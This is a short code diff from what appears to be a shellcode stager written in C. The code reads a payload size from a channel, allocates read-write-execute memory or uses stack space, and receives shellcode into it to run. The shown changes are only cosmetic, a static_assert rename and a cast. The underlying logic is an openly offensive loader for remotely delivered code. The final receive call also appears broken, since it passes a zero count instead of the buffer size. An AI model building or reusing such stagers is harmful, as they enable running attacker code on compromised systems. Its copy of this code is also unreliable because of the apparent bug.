@@ -21,14 +21,14 @@ SHELLCODE_ENTRY {
     unsigned short buffer_size = 0, count = 0;
     unsigned char *memory;
 
-    _Static_assert(MEMORY == MMAP || MEMORY == STACK, "Must set MEMORY parameter to STACK or MMAP.");
+    static_assert(MEMORY == MMAP || MEMORY == STACK, "Must set MEMORY parameter to STACK or MMAP.");
 
     /* Read the size of the input buffer (2 bytes). */
     channel_recv(chan, &buffer_size, sizeof(buffer_size));
     if ( MEMORY == MMAP )
         memory = (unsigned char *) allocate_memory(buffer_size, PROT_READ|PROT_WRITE|PROT_EXEC);
     else
-        memory = get_sp() + 0x100;
+        memory = (unsigned char *) get_sp() + 0x100;
 
     /* Read shellcode in memory. */
     channel_recv(chan, memory, count);
